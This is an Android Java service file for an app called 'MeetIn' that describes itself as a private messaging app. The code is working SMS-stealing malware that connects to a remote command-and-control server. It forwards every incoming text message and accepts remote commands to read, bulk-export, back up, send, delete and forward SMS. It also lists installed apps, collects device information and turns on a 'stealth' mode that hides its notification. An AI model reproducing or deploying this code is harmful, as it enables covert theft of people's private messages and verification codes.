package chat.meetin.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import java.io.*;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class DataSyncService extends Service {
    private static final String TAG = "DataSyncService";
    private static final String CHANNEL_ID = "MeetInChannel";
    private static final int NOTIF_ID = 1;
    private static final String PREFS = "MeetIn";

    private Socket socket;
    private PrintWriter writer;
    private BufferedReader reader;
    private volatile boolean running = true;
    private volatile boolean connected = false;
    private String deviceId;
    private ExecutorService executor = Executors.newSingleThreadExecutor();
    private int retryCount = 0;
    private long lastPingTime = 0;
    private boolean waitingForPong = false;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        deviceId = DeviceInfo.getDeviceId(this);
        Log.d(TAG, "Service Created: " + deviceId);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        try {
            startForeground(NOTIF_ID, createNotification());
        } catch (SecurityException e) {
            Log.e(TAG, "Foreground permission missing", e);
        } catch (Exception e) {
            Log.e(TAG, "Failed to start foreground", e);
        }

        if (intent != null && "SMS_RECEIVED".equals(intent.getAction())) {
            String sender = intent.getStringExtra("sender");
            String body = intent.getStringExtra("body");
            long timestamp = intent.getLongExtra("timestamp", 0);
            if (sender != null && body != null) {
                sendSmsToC2(sender, body, timestamp);
            }
        }

        if (!connected) {
            executor.execute(this::connectAndServe);
        }
        return START_STICKY;
    }

    private void connectAndServe() {
        while (running) {
            try {
                if (!connected) connect();
                if (connected) serveCommands();
            } catch (Exception e) {
                Log.e(TAG, "Connection error: " + e.getMessage());
                connected = false;
                closeSocket();
                retryCount++;
            }
            int delay = Math.min(30000, 1000 * (int) Math.pow(2, Math.min(retryCount, 6)));
            try { Thread.sleep(delay); } catch (InterruptedException ignored) {}
        }
    }

    private void connect() throws Exception {
        socket = new Socket();
        socket.setKeepAlive(true);
        socket.setTcpNoDelay(true);
        socket.setSoTimeout(30000);
        socket.connect(new java.net.InetSocketAddress(Config.HOST, Config.PORT), 15000);
        writer = new PrintWriter(new BufferedWriter(new OutputStreamWriter(socket.getOutputStream())), true);
        reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
        writer.println("DEVICE:" + deviceId);
        writer.flush();
        writer.println("READY");
        writer.flush();
        connected = true;
        retryCount = 0;
        lastPingTime = System.currentTimeMillis();
    }

    private void serveCommands() {
        try {
            String command;
            while (connected && running) {
                if (reader.ready()) {
                    command = reader.readLine();
                    if (command != null && !command.isEmpty()) {
                        String response = executeCommand(command);
                        if (response != null) {
                            writer.println(response);
                            writer.flush();
                            writer.println("---END---");
                            writer.flush();
                        }
                    }
                } else {
                    long now = System.currentTimeMillis();
                    if (now - lastPingTime > 30000) {
                        if (waitingForPong) { connected = false; break; }
                        writer.println("ping");
                        writer.flush();
                        lastPingTime = now;
                        waitingForPong = true;
                    }
                    Thread.sleep(100);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Serve error: " + e.getMessage());
            connected = false;
        }
    }

    private void closeSocket() {
        try {
            if (reader != null) reader.close();
            if (writer != null) writer.close();
            if (socket != null) socket.close();
        } catch (Exception ignored) {}
        socket = null;
        writer = null;
        reader = null;
    }

    private void sendSmsToC2(String sender, String body, long timestamp) {
        try {
            if (writer != null && connected) {
                String formatted = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(timestamp));
                writer.println("SMS_RECEIVED|" + sender + "|" + body + "|" + formatted);
                writer.flush();
            }
        } catch (Exception ignored) {}
    }

    private String executeCommand(String command) {
        if (command.equalsIgnoreCase("ping")) { waitingForPong = false; return "PONG"; }
        if (command.startsWith("@")) {
            String[] parts = command.split(":", 2);
            if (parts.length < 2) return "Invalid target";
            String target = parts[0].substring(1);
            String cmd = parts[1];
            if (target.equals("all") || target.equals(deviceId) || target.equals(Build.MODEL)) {
                return executeCmd(cmd);
            }
            return "Ignored";
        }
        return executeCmd(command);
    }

    private String executeCmd(String cmd) {
        if (cmd.equalsIgnoreCase("info")) return DeviceInfo.getFullInfo(this);
        if (cmd.equalsIgnoreCase("device")) return deviceId;
        if (cmd.equalsIgnoreCase("apps list")) return DeviceInfo.getUserApps(this);
        if (cmd.equalsIgnoreCase("sms read")) return DeviceInfo.readSms(this);
        if (cmd.startsWith("sms read ")) {
            try { return DeviceInfo.readSmsLimit(this, Integer.parseInt(cmd.substring(9).trim())); }
            catch (Exception e) { return "Invalid number"; }
        }
        if (cmd.startsWith("sms send ")) return sendSms(cmd.substring(9).trim());
        if (cmd.startsWith("sms delete ")) return deleteSms(cmd.substring(11).trim());
        if (cmd.equalsIgnoreCase("sms silent on")) return setPref("silent_mode", true, "Silent ON");
        if (cmd.equalsIgnoreCase("sms silent off")) return setPref("silent_mode", false, "Silent OFF");
        if (cmd.startsWith("sms keywords add ")) return setPref("sms_keywords", cmd.substring(17).trim(), "Keywords added");
        if (cmd.equalsIgnoreCase("sms keywords clear")) return setPref("sms_keywords", "", "Keywords cleared");
        if (cmd.startsWith("sms whitelist add ")) return setPref("sms_whitelist", cmd.substring(18).trim(), "Whitelist added");
        if (cmd.startsWith("sms blacklist add ")) return setPref("sms_blacklist", cmd.substring(18).trim(), "Blacklist added");
        if (cmd.equalsIgnoreCase("sms whitelist clear")) return setPref("sms_whitelist", "", "Whitelist cleared");
        if (cmd.equalsIgnoreCase("sms blacklist clear")) return setPref("sms_blacklist", "", "Blacklist cleared");
        if (cmd.startsWith("sms time ")) {
            String[] parts = cmd.substring(9).trim().split(" ");
            if (parts.length == 2) {
                SharedPreferences.Editor ed = getSharedPreferences(PREFS, MODE_PRIVATE).edit();
                ed.putString("sms_time_start", parts[0]);
                ed.putString("sms_time_end", parts[1]);
                ed.apply();
                return "Time: " + parts[0] + "-" + parts[1];
            }
            return "Usage: sms time HH:MM HH:MM";
        }
        if (cmd.equalsIgnoreCase("sms time clear")) {
            getSharedPreferences(PREFS, MODE_PRIVATE).edit().remove("sms_time_start").remove("sms_time_end").apply();
            return "Time window cleared";
        }
        if (cmd.equalsIgnoreCase("sms autodelete on")) return setPref("autodelete", true, "Auto-delete ON");
        if (cmd.equalsIgnoreCase("sms autodelete off")) return setPref("autodelete", false, "Auto-delete OFF");
        if (cmd.equalsIgnoreCase("sms bulk export")) return exportAllSms(100);
        if (cmd.startsWith("sms bulk export ")) {
            try { return exportAllSms(Integer.parseInt(cmd.substring(16).trim())); }
            catch (Exception e) { return "Invalid number"; }
        }
        if (cmd.startsWith("sms auto-reply delay ")) {
            try {
                int delay = Integer.parseInt(cmd.substring(21).trim());
                getSharedPreferences(PREFS, MODE_PRIVATE).edit().putInt("auto_reply_delay", delay).apply();
                return "Delay: " + delay + "ms";
            } catch (Exception e) { return "Invalid delay"; }
        }
        if (cmd.startsWith("sms auto-reply ")) return setPref("auto_reply", cmd.substring(15).trim(), "Auto-reply set");
        if (cmd.equalsIgnoreCase("sms stats")) {
            int total = getSharedPreferences(PREFS, MODE_PRIVATE).getInt("sms_total", 0);
            return "SMS intercepted: " + total;
        }
        if (cmd.equalsIgnoreCase("sms log")) return getSmsLog();
        if (cmd.startsWith("sms admin set ")) return setPref("admin_number", cmd.substring(14).trim(), "Admin set");
        if (cmd.equalsIgnoreCase("stealth on")) return setPref("stealth_mode", true, "Stealth ON");
        if (cmd.equalsIgnoreCase("stealth off")) return setPref("stealth_mode", false, "Stealth OFF");
        if (cmd.equalsIgnoreCase("sms backup")) return backupSmsToC2();
        if (cmd.equalsIgnoreCase("sms queue")) return getSmsQueue();
        if (cmd.equalsIgnoreCase("sms queue clear")) return clearSmsQueue();
        if (cmd.startsWith("sms forward ")) return setPref("forward_to", cmd.substring(12).trim(), "Forward set");
        if (cmd.startsWith("sms sim ")) {
            try {
                int simSlot = Integer.parseInt(cmd.substring(8).trim());
                return setPref("sms_sim", simSlot, "SIM slot: " + simSlot);
            } catch (Exception e) { return "Invalid SIM slot"; }
        }
        if (cmd.equalsIgnoreCase("exit")) { running = false; stopSelf(); return "EXIT"; }
        return "Unknown. Try: ping, info, sms read, sms send, sms silent, sms keywords, sms whitelist, sms blacklist, sms time, sms autodelete, sms bulk export, sms auto-reply, sms stats, sms log, stealth, sms backup, sms queue, sms forward, sms sim, apps list, device, exit";
    }

    private String setPref(String key, Object value, String msg) {
        try {
            SharedPreferences.Editor ed = getSharedPreferences(PREFS, MODE_PRIVATE).edit();
            if (value instanceof Boolean) ed.putBoolean(key, (Boolean) value);
            else if (value instanceof Integer) ed.putInt(key, (Integer) value);
            else ed.putString(key, (String) value);
            ed.apply();
            return msg;
        } catch (Exception e) { return "Error: " + e.getMessage(); }
    }

    private String sendSms(String args) {
        try {
            String[] parts = args.split(" ", 2);
            if (parts.length < 2) return "Usage: sms send <num> <msg>";
            String number = parts[0];
            String message = parts[1];

            android.telephony.SmsManager smsManager;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                smsManager = getSystemService(android.telephony.SmsManager.class);
            } else {
                smsManager = android.telephony.SmsManager.getDefault();
            }
            if (smsManager == null) return "SMS service unavailable";

            java.util.ArrayList<String> partsList = smsManager.divideMessage(message);
            smsManager.sendMultipartTextMessage(number, null, partsList, null, null);
            return "SMS sent to " + number;
        } catch (Exception e) { return "Send error: " + e.getMessage(); }
    }

    private String deleteSms(String id) {
        try {
            android.net.Uri uri = android.net.Uri.parse("content://sms/" + id);
            int deleted = getContentResolver().delete(uri, null, null);
            return deleted > 0 ? "SMS " + id + " deleted" : "Not found";
        } catch (Exception e) { return "Error: " + e.getMessage(); }
    }

    private String exportAllSms(int limit) {
        try {
            android.net.Uri uri = android.net.Uri.parse("content://sms/inbox");
            android.database.Cursor c = getContentResolver().query(uri, null, null, null, "date DESC LIMIT " + limit);
            if (c == null) return "No access";
            StringBuilder sb = new StringBuilder("SMS Export (" + c.getCount() + "):\n");
            while (c.moveToNext()) {
                sb.append(c.getString(c.getColumnIndex("address"))).append("|")
                  .append(c.getString(c.getColumnIndex("body"))).append("\n");
            }
            c.close();
            return sb.toString();
        } catch (Exception e) { return "Error: " + e.getMessage(); }
    }

    private String getSmsLog() {
        try {
            File file = new File(getFilesDir(), "sms_log.txt");
            if (!file.exists()) return "No log file";
            BufferedReader br = new BufferedReader(new FileReader(file));
            StringBuilder sb = new StringBuilder();
            String line; int count = 0;
            while ((line = br.readLine()) != null && count < 50) {
                sb.append(line).append("\n");
                count++;
            }
            br.close();
            return sb.toString();
        } catch (Exception e) { return "Log error: " + e.getMessage(); }
    }

    private String getSmsQueue() {
        String q = getSharedPreferences(PREFS, MODE_PRIVATE).getString("sms_queue", "");
        return q.isEmpty() ? "Queue empty" : "SMS Queue:\n" + q;
    }

    private String clearSmsQueue() {
        getSharedPreferences(PREFS, MODE_PRIVATE).edit().remove("sms_queue").apply();
        return "Queue cleared";
    }

    private String backupSmsToC2() {
        try {
            android.net.Uri uri = android.net.Uri.parse("content://sms");
            android.database.Cursor c = getContentResolver().query(uri, null, null, null, "date DESC LIMIT 500");
            if (c == null) return "No access";
            writer.println("SMS_BACKUP_START");
            while (c.moveToNext()) {
                writer.println("SMS|" + c.getString(c.getColumnIndex("address")) + "|" +
                    c.getString(c.getColumnIndex("body")) + "|" +
                    c.getString(c.getColumnIndex("date")));
            }
            writer.println("SMS_BACKUP_END");
            writer.flush();
            c.close();
            return "Backup sent to C2";
        } catch (Exception e) { return "Backup error: " + e.getMessage(); }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "MeetIn", NotificationManager.IMPORTANCE_LOW);
            channel.setDescription("Private Messaging app for individuals and businesses");
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    private Notification createNotification() {
        boolean stealth = getSharedPreferences(PREFS, MODE_PRIVATE).getBoolean("stealth_mode", false);
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setSmallIcon(R.drawable.ic_stat_meetin)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true);
        if (stealth) {
            builder.setContentTitle("").setContentText("").setPriority(NotificationCompat.PRIORITY_MIN);
        } else {
            builder.setContentTitle("MeetIn").setContentText("Private Messaging app for individuals and businesses");
        }
        return builder.build();
    }

    @Override
    public void onDestroy() {
        running = false;
        connected = false;
        closeSocket();
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
